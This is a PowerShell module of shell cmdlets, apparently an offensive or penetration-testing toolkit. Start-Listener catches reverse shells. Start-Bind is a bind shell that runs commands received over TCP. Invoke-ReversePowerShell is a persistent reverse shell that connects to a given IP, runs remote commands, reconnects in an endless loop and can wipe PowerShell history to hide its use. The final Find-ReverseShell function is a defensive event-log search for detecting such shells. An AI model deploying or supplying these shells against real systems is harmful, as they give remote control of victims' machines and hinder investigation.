<#
.NAME
    Start-Listener


.SYNOPSIS
    This cmdlet is for starting a listener that a reverse shell can attach too.


.DESCRIPTION
    The Start-Listener cmdlet opens a listner port to connect to from a target machine.


.SYNTAX
    Start-Listener [[-Port] <int32>]


.PARAMETERS
    -Port [<Int32>]
        This parameter is for defining the listening port to connect too.
        The cmdlet binds connections to the port that you specify.

        Required?                    false
        Position?                    0
        Default value                1337
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Start-Listener -Port 1234
    This examples connects to a listener on port 1234.

    -------------------------- EXAMPLE 2 --------------------------
    Start-Listener
    This examples connects to a listener on port 1337.


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com


.INPUTS
    None


.OUTPUTS
    None


.LINK
    https://github.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com

#>
Function Start-Listener {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [int32]$Port = 1337
        ) # End param

    Write-Verbose "Defining listener object"
    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);

    If ($Null -eq $Socket)
    {

        Exit

    } # End If

    $PortString = $Port.ToString()

    Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"

    $Socket.Start()
    Write-Output ("Listening on [0.0.0.0] (port " + $Port + ")")
    While ($true)
    {

        Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
        If ($Socket.Pending())
        {

            $Client = $Socket.AcceptTcpClient()

            Break;

        }  # End If

        Start-Sleep -Seconds 1

     }  # End While

    Write-Output "[*] Connection Established."

    Write-Verbose "Creating byte stream"
    $Stream = $Client.GetStream()
    $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
    $Buffer = New-Object -TypeName System.Byte[] 2048
    $Encoding = New-Object -TypeName System.Text.AsciiEncoding

    Write-Verbose "Begin command execution loop"
    Do
    {

        $Command = Read-Host

        $Writer.WriteLine($Command)
        $Writer.Flush();

        If ($Command -eq "exit")
        {

            Write-Verbose "Exiting"
            Break

        }  # End If

        $Read = $Null

        While ($Stream.DataAvailable -or $Null -eq $Read)
        {

            $Read = $Stream.Read($Buffer, 0, 2048)
            $Out = $Encoding.GetString($Buffer, 0, $Read)

            Write-Output $Out

        } # End While

    } While ($Client.Connected -eq $True) # End Do While Loop

    Write-Verbose "Terminating connection"
    $Socket.Stop()
    $Client.Close()
    $Stream.Dispose()
    Write-Verbose "Connection closed"

} # End Function Start-Listener



#-------------------------------------------------------------------------------------------------------------------
<#
.NAME
    Start-Bind


.SYNOPSIS
    This cmdlet is for binding the PowerShell application to a listening port.


.DESCRIPTION
    Start-Bind cmdlet opens a Bind Shell that attaches to PowerShell and listens on a port that you define.


.SYNTAX
    Start-Bind [[-Port] <int32>]


.PARAMETERS
    -Port [<Int32>]
        This parameter is for defining the listening port that PowerShell should attach too
        The cmdlet binds powershell to the port that you specify.

            Required?                    false
            Position?                    0
            Default value                1337
            Accept pipeline input?       false
            Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Start-Bind -Port 1234
    This examples connects powershell.exe to a listener on port 1234.

    -------------------------- EXAMPLE 2 --------------------------
    Start-Bind
    This examples connects powershell.exe to a listener on port 1337.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    None


.OUTPUTS
    None


.LINK
    https://github.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com

#>
Function Start-Bind {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [int32]$Port = 1337
        )  # End param

        $PortString = $Port.ToString()
        Write-Verbose "Creating listener on port $PortString"
        $Listener = [System.Net.Sockets.TcpListener]$Port
        Write-Output "[*] PowerShell.exe is bound to port $PortString"
        $Listener.Start()

        While ($True)
        {

            Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
            If ($Listener.Pending())
            {

                $Client = $Listener.AcceptTcpClient()

                Break;

            }  # End If

            Start-Sleep -Seconds 1

         }  # End While

        Write-Output "[*] Connection Established."
        $Stream = $Client.GetStream()

        Write-Verbose "Streaming bytes to PowerShell connection"
       [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
       $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")

       $Stream.Write($SendBytes,0,$SendBytes.Length)
       $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
       $Stream.Write($SendBytes,0,$SendBytes.Length)

        Write-Verbose "Begin command execution cycle"
       While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
       {

            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $Data = $EncodedText.GetString($Bytes, 0, $i)

            Try
            {

                $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)

            }  # End Try
            Catch
            {

                Write-Output "Failure occured attempting to execute the command on target."

                $Error[0] | Out-String

            }  # End Catch

            Write-Verbose "Initial data send failed. Attempting a second time"
            $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
            $x = ($Error[0] | Out-String)
            $Error.clear()
            $SendBack2 = $SendBack2 + $x

            $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2)
            $Stream.Write($SendByte, 0, $SendByte.Length)
            $Stream.Flush()

        }  # End While

        Write-Verbose "Terminating connection"
        $Client.Close()
        $Listener.Stop()
        Write-Verbose "Connection closed"

}  # End Function Start-Bind



#-------------------------------------------------------------------------------------------------------------------
<#
.NAME
    Invoke-ReversePowerShell


.SYNOPSIS
    This cmdlet is for connecting PowerShell to a listening port on a target machine.
    This function is NOT able to connect to the Start-Bind cmdlet in this module.


.DESCRIPTION
    Connect to a lsitening port on a remote machine to complete a reverse shell.


.SYNTAX
    Invoke-ReversePowerShell [-IpAddress] <string> [[-Port] <int32>]


.PARAMETERS
    -IpAddress [<String>]
        This parameter is for defining the IPv4 address to connect too on a remote machine
        The cmdlet looks for a connection at this IP address on the remote host.

        Required?                    true
        Position?                    0
        Default value                none
        Accept pipeline input?       false
        Accept wildcard characters?  false

    -Port [<Int32>]
        This parameter is for defining the listening port to attach too on a remote machine
        The cmdlet looks for a connection on a remote host using the port that you specify here.

        Required?                    false
        Position?                    1
        Default value                1337
        Accept pipeline input?       false
        Accept wildcard characters?  false

    -ClearHistory [<SwitchParameter>]
        This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session

        Required?                    false
        Position?                    named
        Default value                false
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
    This examples connects to port 1234 on remote machine 192.168.2.1

    -------------------------- EXAMPLE 2 --------------------------
    Invoke-ReversePowerShell 192.168.2.1 1337
    This examples connects to port 1337 on remote machine 192.168.2.1.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    None


.OUTPUTS
    None


.LINK
    https://github.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com

#>
Function Invoke-ReversePowerShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [ValidateNotNullorEmpty()]
            [ValidateRange(1,65535)]
            [int32]$Port = 1337,

            [Parameter(
                Mandatory=$False)]
            [Alias("C","Cls","Ch","Clear")]
            [switch][bool]$ClearHistory
        ) # End param

    Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        Write-Verbose "Default error action is being defined as Continue"
        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Output "Connection attempted. Check your listener."

            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)
            $Stream = $Client.GetStream()

            [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
            $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {

                $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                If ($Command.StartsWith("kill-link"))
                {

                    If ($ClearHistory.IsPresent)
                    {

                        Write-Verbose "[*] Attempting to clear command history"

                        Clear-History
                        Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

                    }  # End If

                    Write-Verbose "Closing client connection"
                    $Client.Close()
                    Write-Verbose "Client connection closed"
                    Exit

                } # End If
                Try
                {

                    # Executes commands
                    $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                } # End Try
                Catch
                {

                    $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                    $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "

                } # End Catch

                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                $Stream.Flush()

            } # End While

        } # End Try
        Catch
        {

            Write-Output "There was a connection error. Retrying occurs every 30 seconds"
            If ($Client.Connected)
            {

                If ($ClearHistory.IsPresent)
                {

                    Write-Verbose "[*] Attempting to clear command history"

                    Clear-History
                    Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

                }  # End If

                Write-Verbose "Client closing"
                $Client.Close()
                Write-Verbose "Client connection closed"

            } # End If

            If ($ClearHistory.IsPresent)
            {

                Write-Verbose "[*] Attempting to clear command history"

                Clear-History
                Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

            }  # End If

            Write-Verbose "Begining countdown timer to reestablish failed connection"
            [int]$Time = 30
            $Length = $Time / 100

            For ($Time; $Time -gt 0; $Time--)
            {

                $Text = "0:" + ($Time % 60) + " seconds left"
                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Time / $Length)
                Start-Sleep -Seconds 1

            }  # End For

        } # End Catch

    } # End While

} # End Function Invoke-ReversePowerShell

#-------------------------------------------------------------------------------------------------------------------
<#
.NAME
    Find-ReverseShell


.SYNOPSIS
    This cmdlet can be used to discover reverse shell connections from the past 24 hours. It will ignore connections from
    the user Paessler as PRTG uses a similar method for creating a TCP socket listener. This will not identify powercat.ps1
    reverse shell connections as those are created using a different method.


.DESCRIPTION
    Search the Windows Event Viewer for event id 4656 where a tcp listener was created and connected too.
    The appropriate logging will need to be enabled in the event viewer.


.PARAMETERS
    -ComputerName [<String>]
        This parameter is for helping to better define a connection you may want to look for. This parameter is currently
        not in use for this cmdlet.

            Required?                    false
            Position?                    0
            Default value                none
            Accept pipeline input?       false
            Accept wildcard characters?  false

    -Path [<String>]
        Specifies a path to one locations. Wildcards are not permitted.

        Required?                    false
        Position?                    1
        Default value                none
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.SYNTAX
    Find-ReverseShell [-ComputerName <string>] [-FilePath <string>]


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    Find-ReverseShell
        This example searches for connections from a remote host.

    -------------------------- EXAMPLE 2 --------------------------
    Find-ReverseShell -ComputerName Desktop01 -FilePath C:\Temp\log.evt
        This example searches the localhost for evidence of reverse shell connections built on connections to a tcp socket.
        It also saves the log file to C:\Users\<username>\AppData\Local\ReverseShell_Logs_2020.01.20.evt


.NOTES
    Author: Robert H. Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com


.INPUTS
    None


.OUTPUTS
    System.Diagnostics.Eventing.Reader.EventLogntLogRecord
    Find-ReverseShell returns System.Diagnostics.Eventing.Reader.EventLogRecord objects.

.LINK
    https://www.powershellgallery.com/profiles/tobor
    https://github.com/tobor88
    https://roberthosborne.com

#>
Function Find-ReverseShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                HelpMessage="Enter a hostname, FQDN, or an IPv4 address")]
            [string]$ComputerName = $env:COMPUTERNAME,

            [Parameter(
                Mandatory=$False,
                Position=1,
                HelpMessage="Enter the full path name to a .evt file. Example: C:\Temp\results.evt")]
            [string]$FilePath = "$env:LOCALAPPDATA\ReverseShell_Logs_" + (Get-Date -Format 'yyyy.MM.dd') + ".xml"
        ) # End param


    Write-Output "Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object"
    $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorAction SilentlyContinue

    ## This part is a work in progress. Need to discover how to identify this connection.
    # Write-Output "Checking for a Reverse Shell created by a tool such as PowerCat that execute Reverse Shell commands as a process using WSMAN"
    # $PowerCatListenerCheck = Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='ObjectName']='\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN'] and EventData[Data[@Name='SubjectUserName']!=`'$ComputerName$`']]" | Select Message | fl *

    If ($Null -ne $TcpListenerCheck)
    {

        Write-Verbose "Event was found"
        $TcpListenerCheck | Select-Object -Property *

        Write-Verbose "Building XML file"
        $TcpListenerCheck.ToXml() | Out-File -FilePath $FilePath

        Write-Output "Reverse Shell check has completed. A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."

    }  # End If
    Else
    {

        Write-Output "No Reverse shells have been discovered to exist in the last 24 hours."

    }  # End Else

} # End Function Find-ReverseShell
